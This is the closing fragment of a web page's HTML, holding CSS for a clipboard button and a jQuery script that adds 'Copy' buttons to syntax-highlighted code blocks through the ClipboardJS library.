        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>